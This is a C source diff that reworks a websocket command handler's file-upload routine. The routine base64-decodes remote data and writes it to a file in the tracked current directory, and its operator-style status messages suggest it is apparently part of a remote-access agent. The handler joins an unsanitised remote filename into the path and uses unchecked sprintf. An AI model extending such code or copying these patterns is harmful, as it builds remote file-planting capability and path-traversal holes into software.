@@ -3278,61 +3278,62 @@ int handle_upload_data(char* data, int len) {
     char* upload_start = strstr(data, "<<<UPLOAD_START>>>");
     if (upload_start && !g_upload_in_progress) {
         char* name_end = strstr(data, "<<<NAME_END>>>");
-        if (name_end) {
-            // Extract filename
+        char* upload_end = strstr(data, "<<<UPLOAD_END>>>");
+        
+        if (name_end && upload_end) {
+            // Extract filename and size (format: filename|size)
             char* filename_start = upload_start + 18;  // len of <<<UPLOAD_START>>>
-            int filename_len = name_end - filename_start;
-            if (filename_len > 0 && filename_len < MAX_PATH) {
-                strncpy(g_upload_filename, filename_start, filename_len);
-                g_upload_filename[filename_len] = '\0';
-                
-                // Create full path in current directory
-                char full_path[MAX_PATH * 2];
-                sprintf(full_path, "%s\\%s", g_current_dir, g_upload_filename);
-                
-                g_upload_file = fopen(full_path, "wb");
-                if (g_upload_file) {
-                    g_upload_in_progress = 1;
-                    g_upload_received = 0;
+            char* pipe = strchr(filename_start, '|');
+            if (pipe && pipe < name_end) {
+                int filename_len = pipe - filename_start;
+                if (filename_len > 0 && filename_len < MAX_PATH) {
+                    strncpy(g_upload_filename, filename_start, filename_len);
+                    g_upload_filename[filename_len] = '\0';
                     
-                    char msg[512];
-                    sprintf(msg, "[*] Receiving file: %s\n", g_upload_filename);
-                    send_websocket_data(msg, strlen(msg));
+                    // Get expected size
+                    long expected_size = atol(pipe + 1);
                     
-                    // Write any data after NAME_END marker
-                    char* file_data = name_end + 14;  // len of <<<NAME_END>>>
-                    int remaining = len - (file_data - data);
+                    // Extract base64 data
+                    char* b64_start = name_end + 14;  // len of <<<NAME_END>>>
+                    int b64_len = upload_end - b64_start;
                     
-                    // Check if this chunk also contains the end marker
-                    char* upload_end = strstr(file_data, "<<<UPLOAD_END>>>");
-                    if (upload_end) {
-                        int data_len = upload_end - file_data;
-                        if (data_len > 0) {
-                            fwrite(file_data, 1, data_len, g_upload_file);
-                            g_upload_received += data_len;
-                        }
-                        fclose(g_upload_file);
-                        g_upload_file = NULL;
-                        g_upload_in_progress = 0;
+                    if (b64_len > 0) {
+                        // Decode base64
+                        DWORD decoded_size = 0;
+                        CryptStringToBinaryA(b64_start, b64_len, CRYPT_STRING_BASE64, NULL, &decoded_size, NULL, NULL);
                         
-                        char done_msg[512];
-                        sprintf(done_msg, "[+] File saved: %s (%ld bytes)\n", full_path, g_upload_received);
-                        send_websocket_data(done_msg, strlen(done_msg));
-                    } else if (remaining > 0) {
-                        fwrite(file_data, 1, remaining, g_upload_file);
-                        g_upload_received += remaining;
+                        if (decoded_size > 0) {
+                            BYTE* decoded_data = (BYTE*)malloc(decoded_size);
+                            if (decoded_data) {
+                                if (CryptStringToBinaryA(b64_start, b64_len, CRYPT_STRING_BASE64, decoded_data, &decoded_size, NULL, NULL)) {
+                                    // Create full path in current directory
+                                    char full_path[MAX_PATH * 2];
+                                    sprintf(full_path, "%s\\%s", g_current_dir, g_upload_filename);
+                                    
+                                    FILE* f = fopen(full_path, "wb");
+                                    if (f) {
+                                        fwrite(decoded_data, 1, decoded_size, f);
+                                        fclose(f);
+                                        
+                                        char msg[512];
+                                        sprintf(msg, "[+] File saved: %s (%lu bytes)\n", full_path, decoded_size);
+                                        send_websocket_data(msg, strlen(msg));
+                                    } else {
+                                        send_websocket_data("[!] Failed to create file\n", 27);
+                                    }
+                                }
+                                free(decoded_data);
+                            }
+                        }
                     }
                     return 1;
-                } else {
-                    send_websocket_data("[!] Failed to create file\n", 27);
-                    return -1;
                 }
             }
         }
         return 1;
     }
     
-    // Check for upload end marker
+    // Legacy chunked upload handling (for backward compatibility)
     if (g_upload_in_progress) {
         char* upload_end = strstr(data, "<<<UPLOAD_END>>>");
         if (upload_end) {
